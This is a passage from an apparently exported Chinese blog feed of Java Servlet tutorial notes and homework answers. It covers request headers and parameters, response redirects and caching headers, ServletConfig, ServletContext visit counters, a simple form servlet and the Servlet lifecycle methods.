name)方法—Enumeration<String></li><li>getHeaderNames方法—Enumeration<String></li></ul><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestServletDemo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 获得所有头信息</span><br>Enumeration&lt;String&gt; names = request.getHeaderNames();<br><span class="hljs-keyword">while</span> (names.hasMoreElements()) &#123;<br><span class="hljs-comment">// 每个头信息 名称</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> names.nextElement();<br><span class="hljs-comment">// 根据name 获得 value</span><br>System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + request.getHeader(name));<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;--------------------------------------&quot;</span>);<br><span class="hljs-comment">// 获得一个指定头信息</span><br>System.out.println(request.getHeader(<span class="hljs-string">&quot;User-Agent&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-3、获取请求参数："><a href="#2-3-3、获取请求参数：" class="headerlink" title="2.3.3、获取请求参数："></a>2.3.3、获取请求参数：</h4><ul><li>getParameter(name)—String 通过name获得值</li><li>getParameterValues—String[]通过name获得多值checkbox</li><li>getParameterNames—Enumeration<String>获得所有name</li><li>getParameterMap—Map&lt;String, String[]&gt; key :name value:多值</li></ul><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestServletDemo3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 接收request.html 提交数据</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>System.out.println(<span class="hljs-string">&quot;password=&quot;</span> + password);<br><span class="hljs-comment">// 判断name是否为空</span><br><span class="hljs-keyword">if</span> (name == <span class="hljs-literal">null</span> || name.trim().length() == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">// 不合法</span><br>request.getRequestDispatcher(<span class="hljs-string">&quot;/request/request3.html&quot;</span>).forward(<br>request, response);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">// 获得多值 属性 hobby</span><br><span class="hljs-comment">// 如果存在多个值 getParameter 只能获得第一个值</span><br><span class="hljs-comment">// url?hobby=sport&amp;hobby=music ---- 使用getParameterValues</span><br>System.out.println(request.getParameter(<span class="hljs-string">&quot;hobby&quot;</span>));<br>String[] arr = request.getParameterValues(<span class="hljs-string">&quot;hobby&quot;</span>);<br>System.out.println(Arrays.toString(arr));<br><br><span class="hljs-comment">// 下面通过getParameterNames 和 getParameterMap 遍历所有请求参数</span><br>System.out.println(<span class="hljs-string">&quot;---------------------------------------&quot;</span>);<br><br><span class="hljs-comment">// 第一种通过getParameterNames</span><br>Enumeration&lt;String&gt; names = request.getParameterNames();<br><span class="hljs-keyword">while</span> (names.hasMoreElements()) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">parameterName</span> <span class="hljs-operator">=</span> names.nextElement();<br>String[] parameterValues = request.getParameterValues(parameterName);<br>System.out.println(parameterName + <span class="hljs-string">&quot;:&quot;</span>+ Arrays.toString(parameterValues));<br>&#125;<br><br><span class="hljs-comment">// 第二种通过 getParameterMap 遍历所有数据</span><br>Map&lt;String, String[]&gt; map = request.getParameterMap();<br><span class="hljs-comment">// 通过keySet entrySet两种方式遍历map</span><br>System.out.println(<span class="hljs-string">&quot;getParameterMap keySet----------------------&quot;</span>);<br>Set&lt;String&gt; keySet = map.keySet();<br><span class="hljs-keyword">for</span> (String key : keySet) &#123;<br>String[] values = map.get(key);<br>System.out.println(key + <span class="hljs-string">&quot;: &quot;</span> + Arrays.toString(values));<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;getParameterMap entrySet----------------------&quot;</span>);<br>Set&lt;Entry&lt;String, String[]&gt;&gt; entrySet = map.entrySet();<br><span class="hljs-keyword">for</span> (Entry&lt;String, String[]&gt; entry : entrySet) &#123;<br>System.out.println(entry.getKey() + <span class="hljs-string">&quot;: &quot;</span>+ Arrays.toString(entry.getValue()));<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4、HttpServletResponse接口"><a href="#2-4、HttpServletResponse接口" class="headerlink" title="2.4、HttpServletResponse接口"></a>2.4、HttpServletResponse接口</h3><p>HttpServletResponse对象提供服务器对客户端的http响应，它封装了向客户端提供数据、发送响应头、发送相应状态码等方法，这里主要说明指定状态码&amp;头信息，状态码和头信息应用以及它生成响应等操作。</p><h4 id="2-4-1、指定状态码-头信息以及头信息应用："><a href="#2-4-1、指定状态码-头信息以及头信息应用：" class="headerlink" title="2.4.1、指定状态码&amp;头信息以及头信息应用："></a>2.4.1、指定状态码&amp;头信息以及头信息应用：</h4><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseServletDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 设置状态码setStatus</span><br><span class="hljs-comment">// response.setStatus(404);</span><br><span class="hljs-comment">// response.setStatus(200);</span><br><br><span class="hljs-comment">// 重定向设置使浏览器去访问另一个WEB资源</span><br>response.setStatus(HttpServletResponse.SC_FOUND);<br><span class="hljs-comment">// 浏览器重定向，相对的和绝对的都可以</span><br><span class="hljs-comment">// response.setHeader(&quot;Location&quot;, &quot;index.jsp&quot;);</span><br><span class="hljs-comment">// response.setHeader(&quot;Location&quot;, &quot;/lesson9_jsp/index.jsp&quot;);</span><br><span class="hljs-comment">// 简化重定向</span><br>response.sendRedirect(<span class="hljs-string">&quot;/lesson9_jsp/index.jsp&quot;</span>);<br><br><span class="hljs-comment">// 3秒后自动跳转 index.jsp</span><br><span class="hljs-comment">// 如果是客户端访问一个路径，此时必须 /工程名</span><br>response.setHeader(<span class="hljs-string">&quot;refresh&quot;</span>, <span class="hljs-string">&quot;3;url=/lesson9_jsp/index.jsp&quot;</span>);<br><span class="hljs-comment">// 在跳转同时，提示用户页面将要跳转</span><br>response.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>response.getWriter().println(<span class="hljs-string">&quot;页面将在3秒后 自动跳转index.jsp, 如果没有跳转请点击&lt;a href=&#x27;/lesson9_jsp/index.jsp&#x27;&gt;这里&lt;/a&gt;&quot;</span>);<br><br><span class="hljs-comment">// 设置三个禁止缓存头字段</span><br>response.setHeader(<span class="hljs-string">&quot;Cache-Control&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>);<br>response.setHeader(<span class="hljs-string">&quot;Pragma&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>);<br><span class="hljs-comment">// 设置Expires时，一般不设置String 日期字符串 书写复杂</span><br><span class="hljs-comment">// 参数一个毫秒 -1毫秒 -- java中时间 从1970年1月1日 0点开始计时</span><br><span class="hljs-comment">// 当前网页已经过期</span><br>response.setDateHeader(<span class="hljs-string">&quot;Expires&quot;</span>, -<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-4-2、response生成响应："><a href="#2-4-2、response生成响应：" class="headerlink" title="2.4.2、response生成响应："></a>2.4.2、response生成响应：</h4><p>部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseServletDemo5</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 设置浏览器查看编码两种方式</span><br><span class="hljs-comment">// setContentType 具有 setCharacterEncoding 效果</span><br>response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br><span class="hljs-comment">// getOutputStream 与 getWriter 不能同时使用</span><br><br><span class="hljs-comment">//字节流数据输出</span><br><span class="hljs-comment">// 下面语句报错提示：类型不匹配：不能从 HttpServletResponse 转换为 OutputStream</span><br><span class="hljs-comment">// OutputStream out = response。getOutputStream();</span><br><br><span class="hljs-comment">// 字符流输出</span><br><span class="hljs-comment">// response.getWriter().println(&quot;今天天气多云，可能有雨！&quot;);</span><br><br><span class="hljs-comment">// tomcat会自动关流</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/assets/images/jsp-3-1.jpg" alt="Response Notice" loading="lazy"></p><h3 id="2-5、ServletConfig接口与ServletContext接口"><a href="#2-5、ServletConfig接口与ServletContext接口" class="headerlink" title="2.5、ServletConfig接口与ServletContext接口"></a>2.5、ServletConfig接口与ServletContext接口</h3><h4 id="2-5-1、关于ServletConfig接口："><a href="#2-5-1、关于ServletConfig接口：" class="headerlink" title="2.5.1、关于ServletConfig接口："></a>2.5.1、关于ServletConfig接口：</h4><p>在Servlet的配置文件中，可以使用一个或者多个<init-param>标签为servlet配置一些初始化参数，当servlet配置了初始化参数后，web容器在创建servlet实例对象时，会自动将这些初始化参数封装到ServletConfig对象中，并在调用servlet的init方法时，将ServletConfig的对象传递给servlet，进而，程序员通过ServletConfig对象就可以得到当前servlet的初始化参数信息，从一个servlet实例化之后，对任何客户端的任何时候访问都有效，一个servlet的ServletConfig不能被其他servlet访问。</p><p>部分代码如下所示:</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletConfigDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-comment">// private ServletConfig config;</span><br><span class="hljs-comment">// @Override</span><br><span class="hljs-comment">// public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="hljs-comment">// // 父类GenericServlet中已经做了this.config=config就不需要重写了,不需要覆盖带参数的初始化方法</span><br><span class="hljs-comment">// // this.config = config;</span><br><span class="hljs-comment">// // 传入一个ServletConfig 参数，获得Servlet实例初始化数据</span><br><span class="hljs-comment">// System.out.println(&quot;init &quot; + config.getInitParameter(&quot;uname&quot;));</span><br><span class="hljs-comment">// System.out.println(&quot;init &quot; + config.getInitParameter(&quot;password&quot;));</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// // 获得所有参数name的集合</span><br><span class="hljs-comment">// Enumeration&lt;String&gt; names = config.getInitParameterNames();</span><br><span class="hljs-comment">// // 遍历names 获取所有初始化参数值</span><br><span class="hljs-comment">// while (names.hasMoreElements()) &#123;</span><br><span class="hljs-comment">// String name = (String) names.nextElement();</span><br><span class="hljs-comment">// System.out.println(&quot;init &quot; + name + &quot;=&quot;</span><br><span class="hljs-comment">// + config.getInitParameter(name));</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><span class="hljs-comment">// 覆盖无参的初始化方法,config是私有的参数,就不能用了,通过getServletConfig方法获取config对象</span><br>System.out.println(<span class="hljs-string">&quot;init &quot;</span> + getServletConfig().getInitParameter(<span class="hljs-string">&quot;uname&quot;</span>));<br>System.out.println(<span class="hljs-string">&quot;init &quot;</span> + getServletConfig().getInitParameter(<span class="hljs-string">&quot;password&quot;</span>));<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 在doGet方法中 如何获得初始化数据 ？？？？从init 方法传递config 到doGet</span><br><span class="hljs-comment">// 使用保存成员变量 config 获得初始化信息</span><br><span class="hljs-comment">// System.out.println(&quot;doGet &quot; + config.getInitParameter(&quot;uname&quot;));</span><br><span class="hljs-comment">// System.out.println(&quot;doGet &quot; + config.getInitParameter(&quot;password&quot;));</span><br><br>System.out.println(<span class="hljs-string">&quot;doGet &quot;</span>+ getServletConfig().getInitParameter(<span class="hljs-string">&quot;uname&quot;</span>));<br>System.out.println(<span class="hljs-string">&quot;doGet &quot;</span>+ getServletConfig().getInitParameter(<span class="hljs-string">&quot;password&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-5-2、关于ServletContext接口："><a href="#2-5-2、关于ServletContext接口：" class="headerlink" title="2.5.2、关于ServletContext接口："></a>2.5.2、关于ServletContext接口：</h4><p>在WEB容器启动的时候，他会为每一个WEB应用程序都创建一个对应的ServletContext对象，它代表当前web应用。ServletCofig对象中维护了ServletContext对象的引用，开发人员在编写servlet时，可以通过ServletConfig.getServletContext方法获得ServletContext对象。由于一个WEB应用中的所有Servlet共享同一个ServletContext对象来实现通讯。ServletContext对象通常也被称之为context域对象。ServletContext对恩赫servlet，任何人在任何时间都有效，是真正的全部对象。</p><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletContextCountDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-comment">// 初始化访问次数0</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><span class="hljs-comment">// 在ServletContext对象中保存一个访问次数</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> getServletContext();<br><span class="hljs-comment">// 保存一个数据</span><br>context.setAttribute(<span class="hljs-string">&quot;count&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// 每次访问获得原来访问次数+1</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> getServletContext();<br><span class="hljs-comment">// 或者使用下面这条语句获取context</span><br><span class="hljs-comment">// ServletContext context = getServletConfig().getServletContext();</span><br><span class="hljs-comment">// 获得访问次数</span><br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> (Integer) context.getAttribute(<span class="hljs-string">&quot;count&quot;</span>);<br><span class="hljs-comment">// 次数+1保存</span><br>count++;<br>context.setAttribute(<span class="hljs-string">&quot;count&quot;</span>, count);<br>System.out.println(<span class="hljs-string">&quot;网站被访问次数为&quot;</span> + count);<br><span class="hljs-comment">// 浏览器显示中文</span><br>response.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>response.getWriter().println(<span class="hljs-string">&quot;Demo1网站被访问次数为&quot;</span> + count);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet课后作业-JSP作业-1</title>
      <link href="/2016/11/29/jsp-homework-1/"/>
      <url>/2016/11/29/jsp-homework-1/</url>
      
        <content type="html"><![CDATA[<h1 id="作业要求："><a href="#作业要求：" class="headerlink" title="作业要求："></a>作业要求：</h1><ol><li><a href="#1-1" id="1">编写一个Serlvet以便显示该Servlet被访问的次数。</a></li><li><a href="#2-2" id="2">编写一个Servlet程序，在doGet方法中显示一个Form表单，用户可以输入姓名和电子邮件地址，用户提交该表单后，doPost方法动态读出请求参数，并输出这些参数。提示：使用request对象的getParameterNames（）方法。</a></li><li><a href="#3-3" id="3">描述Serlvet的生命周期。</a></li><li><a href="#4-4" id="4">实现Servlet有几种方法，每种方法都有哪些特点。</a></li><li><a href="#5-5" id="5">如何配置Serlvet。</a></li></ol><h1 id="开始作业"><a href="#开始作业" class="headerlink" title="开始作业"></a>开始作业</h1><blockquote><p><a id="1-1"></a>作业 1：<a href="#1">点此查看要求</a></p></blockquote><p>仅贴出Servlet的主体代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Servlet_1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@see</span> HttpServlet#HttpServlet()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Servlet_1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>    &#125;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">1</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">//super.doGet(req, resp);</span><br>resp.setHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);  <br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> resp.getWriter();<br>pw.println(<span class="hljs-string">&quot;Servlet被访问的次数为：&quot;</span>+num++);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行图示如下：</p><p><img src="/assets/images/jsp-work-1-1.jpg" alt="Servlet Num" loading="lazy"></p><blockquote><p><a id="2-2"></a>作业 2：<a href="#2">点此查看要求</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Servlet_2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@see</span> HttpServlet#HttpServlet()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Servlet_2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>    &#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// super.doGet(req, resp);</span><br><span class="hljs-keyword">try</span> &#123;<br>req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>resp.setHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);  <br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>out.println(<span class="hljs-string">&quot;&lt;html&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;head&gt;&lt;title&gt;表单提交&lt;/title&gt;&lt;/head&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;body&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;h1&gt;表单提交页面&lt;/h1&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;form action=&#x27;Servlet_2&#x27; method=&#x27;post&#x27;&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;姓名：&lt;input type=&#x27;text&#x27; name=&#x27;name&#x27; /&gt;&lt;br&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;邮箱：&lt;input type=&#x27;mail&#x27; name=&#x27;mail&#x27; /&gt;&lt;br&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;提交&#x27;&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/form&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/body&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// super.doPost(req, resp);</span><br>req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>resp.setHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);  <br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">mail</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;mail&quot;</span>);<br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>out.println(<span class="hljs-string">&quot;提交的姓名为：&quot;</span>+name+<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>);<br>out.println(<span class="hljs-string">&quot;提交的邮箱为：&quot;</span>+mail+<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行图示如下：</p><p><img src="/assets/images/jsp-work-1-2.jpg" alt="Form Page" loading="lazy"><br><img src="/assets/images/jsp-work-1-3.jpg" alt="Form Submit" loading="lazy"></p><blockquote><p><a id="3-3"></a>作业 3：<a href="#3">点此查看要求</a></p></blockquote><p>  具体答案内容，请查看<a href="https://bugwz.com/jsp_2/#jsp_2_lifecycle">这里</a></p><blockquote><p><a id="4-4"></a>作业 4：<a href="#4">点此查看要求</a></p></blockquote><p>Servlet有三种实现方式：</p><ul><li>继承原生Servlet接口</li><li>继承GenericServlet类</li><li>继承HttpServlet类</li></ul><h1 id="Servlet的这三种实现方式的具体讲解如下："><a href="#Servlet的这三种实现方式的具体讲解如下：" class="headerlink" title="Servlet的这三种实现方式的具体讲解如下："></a>Servlet的这三种实现方式的具体讲解如下：</h1><h2 id="1-继承原生Servlet接口："><a href="#1-继承原生Servlet接口：" class="headerlink" title="1.继承原生Servlet接口："></a>1.继承原生Servlet接口：</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Servlet_1_1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_1_1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        System.out.println(<span class="hljs-string">&quot;destroy....&quot;</span>);  <br>    &#125;<br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-comment">// TODO Auto-generated method stub  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;<br>    <span class="hljs-comment">//该 函数用于初始化，只会被调用一次（当用户第一次访问Servlet时，被调用）  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig arg0)</span> <span class="hljs-keyword">throws</span> ServletException &#123;  <br>        <span class="hljs-comment">// TODO Auto-generated method stub  </span><br>        System.out.println(<span class="hljs-string">&quot;init....&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//用于处理业务逻辑，应该把业务逻辑代码写在该方法中  </span><br>    <span class="hljs-comment">//会被多次调用，当用户每访问一次时就会被调用一次  </span><br>    <span class="hljs-comment">//request用于获取客户端的信息  </span><br>    <span class="hljs-comment">//response用户向客户端返回信息  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest request, ServletResponse response)</span>  <br>            <span class="hljs-keyword">throws</span> ServletException, IOException &#123;  <br>        <span class="hljs-comment">// TODO Auto-generated method stub  </span><br>        System.out.println(<span class="hljs-string">&quot;service....&quot;</span>);       <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注解："><a href="#注解：" class="headerlink" title="注解："></a>注解：</h3><p>这种实现方法是新建一个类，该类继承了Servlet接口，因为新建类的缘故，我们需要手动添加<code>@WebServlet(&quot;/Servlet_1_1&quot;)</code>代码，然后重写Servlet接口的五个方法。</p><h4 id="题外话：Servlet接口的五个方法"><a href="#题外话：Servlet接口的五个方法" class="headerlink" title="题外话：Servlet接口的五个方法"></a>题外话：Servlet接口的五个方法</h4><ol><li>init()</li><li>service()</li><li>destroy()</li><li>getServletConfig()</li><li>getServletInfo()</li></ol><h3 id="init-方法："><a href="#init-方法：" class="headerlink" title="init()方法："></a>init()方法：</h3><p>在Servlet实例化后，Servlet容器会调用init()方法来初始化该对象，主要是为了让Servlet对象在处理客户请求前可以完成一些初始化工作，例如：建立数据库的连接，获取配置信息等。对于每一个Servlet实例，init()方法只能被调用一次。init()方法有一个类型为ServletConfig的参数，Servlet容器通过这个参数向Servlet传递配置信息。Servlet使用ServletConfig对象从Web应用程序的配置信息中获取以名-值对形式提供的初始化参数。另外，在Servlet中，还可以通过ServletConfig对象获取描述Servlet运行环境的ServletContext对象，使用该对象，Servlet可以和它的Servlet容器进行通信。</p><h3 id="Service-方法："><a href="#Service-方法：" class="headerlink" title="Service()方法："></a>Service()方法：</h3><p>容器调用service()方法来处理客户端的请求。要注意的是，在service()方法被容器调用之前，必须确保init()方法正确完成。容器会构造一个表示客户端请求信息的请求对象（类型为ServletRequest）和一个用于对客户端进行响应的响应对象（类型为ServletResponse）作为参数传递给service()。在service()方法中，Servlet对象通过ServletRequest对象得到客户端的相关信息和请求信息，在对请求进行处理后，调用ServletResponse对象的方法设置响应信息。</p><h3 id="destroy-方法："><a href="#destroy-方法：" class="headerlink" 